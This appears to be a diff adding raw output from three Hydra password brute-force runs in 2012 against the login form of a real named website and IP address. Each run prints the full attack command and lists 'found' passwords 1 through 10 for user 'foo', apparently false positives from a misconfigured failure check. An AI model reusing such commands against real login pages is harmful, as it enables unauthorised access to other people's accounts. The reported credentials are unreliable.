@@ -1,0 +1,30 @@
+# Hydra v7.4 run at 2012-09-23 14:49:45 on pualounge.de http-post-form (hydra  -l foo -P passwords.txt -t 10 -o hydra-http-post-attack.txt -w 0 pualounge.de http-post-form /login.php:login=^USER^&password=^PASS^:Access denied[80][www-form] host: 85.214.74.73   login: foo   password: 5
+[80][www-form] host: 85.214.74.73   login: foo   password: 9
+[80][www-form] host: 85.214.74.73   login: foo   password: 2
+[80][www-form] host: 85.214.74.73   login: foo   password: 6
+[80][www-form] host: 85.214.74.73   login: foo   password: 3
+[80][www-form] host: 85.214.74.73   login: foo   password: 1
+[80][www-form] host: 85.214.74.73   login: foo   password: 8
+[80][www-form] host: 85.214.74.73   login: foo   password: 7
+[80][www-form] host: 85.214.74.73   login: foo   password: 4
+[80][www-form] host: 85.214.74.73   login: foo   password: 10
+# Hydra v7.4 run at 2012-09-23 14:50:25 on pualounge.de http-post-form (hydra  -V -l foo -P passwords.txt -t 10 -o hydra-http-post-attack.txt -w 0 pualounge.de http-post-form /login.php:login=^USER^&password=^PASS^:Access denied[80][www-form] host: 85.214.74.73   login: foo   password: 2
+[80][www-form] host: 85.214.74.73   login: foo   password: 1
+[80][www-form] host: 85.214.74.73   login: foo   password: 3
+[80][www-form] host: 85.214.74.73   login: foo   password: 4
+[80][www-form] host: 85.214.74.73   login: foo   password: 5
+[80][www-form] host: 85.214.74.73   login: foo   password: 7
+[80][www-form] host: 85.214.74.73   login: foo   password: 6
+[80][www-form] host: 85.214.74.73   login: foo   password: 8
+[80][www-form] host: 85.214.74.73   login: foo   password: 9
+[80][www-form] host: 85.214.74.73   login: foo   password: 10
+# Hydra v7.4 run at 2012-09-23 14:50:33 on pualounge.de http-post-form (hydra  -V -l foo -P passwords.txt -t 10 -o hydra-http-post-attack.txt -w 0 pualounge.de http-post-form /login.php:login=^USER^&password=^PASS^:Access denied[80][www-form] host: 85.214.74.73   login: foo   password: 3
+[80][www-form] host: 85.214.74.73   login: foo   password: 1
+[80][www-form] host: 85.214.74.73   login: foo   password: 4
+[80][www-form] host: 85.214.74.73   login: foo   password: 2
+[80][www-form] host: 85.214.74.73   login: foo   password: 5
+[80][www-form] host: 85.214.74.73   login: foo   password: 7
+[80][www-form] host: 85.214.74.73   login: foo   password: 8
+[80][www-form] host: 85.214.74.73   login: foo   password: 9
+[80][www-form] host: 85.214.74.73   login: foo   password: 6
+[80][www-form] host: 85.214.74.73   login: foo   password: 10
